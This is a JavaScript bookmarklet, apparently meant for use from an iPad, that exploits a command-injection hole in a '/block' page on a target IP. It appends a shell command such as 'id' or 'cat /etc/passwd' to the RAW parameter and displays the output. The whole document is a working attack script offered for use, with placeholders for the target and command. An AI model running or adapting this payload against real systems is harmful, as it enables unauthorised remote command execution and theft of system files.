# Snake-eye- iPad book mark javascript:(async()=>{
    const target="http://10.10.10.16"; // CHANGE THIS TO YOUR TARGET IP
    const cmd="id"; // CHANGE THIS TO YOUR COMMAND (e.g., "whoami", "cat /etc/passwd")
    
    try {
        // Construct the payload
        const url=`${target}/block?RAW=${encodeURIComponent(';'+cmd)}`;
        
        // Fetch the block page
        const response=await fetch(url);
        const html=await response.text();
        
        // Parse the output
        // We look for the 'RAW' parameter in the HTML source or common output patterns
        const rawMatch=html.match(/RAW=(.*?)(?:&|$)/i);
        let output="No direct RAW match found.";
        
        if(rawMatch){
            output=decodeURIComponent(rawMatch[1]);
        } else {
            // Fallback: Look for command output in the body text
            // This is a heuristic search; adjust regex based on actual HTML structure
            const bodyMatch=html.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
            if(bodyMatch){
                output="Check the page source manually. Output likely embedded in body.";
            }
        }
        
        // Display result in an alert box
        alert(`[+] Command: ${cmd}\n\n[-] Result:\n${output}`);
        
        // Optional: Open the block page in a new tab to see visual confirmation
        window.open(url,'_blank');
        
    } catch(e) {
        alert("Error: "+e.message);
    }
})();
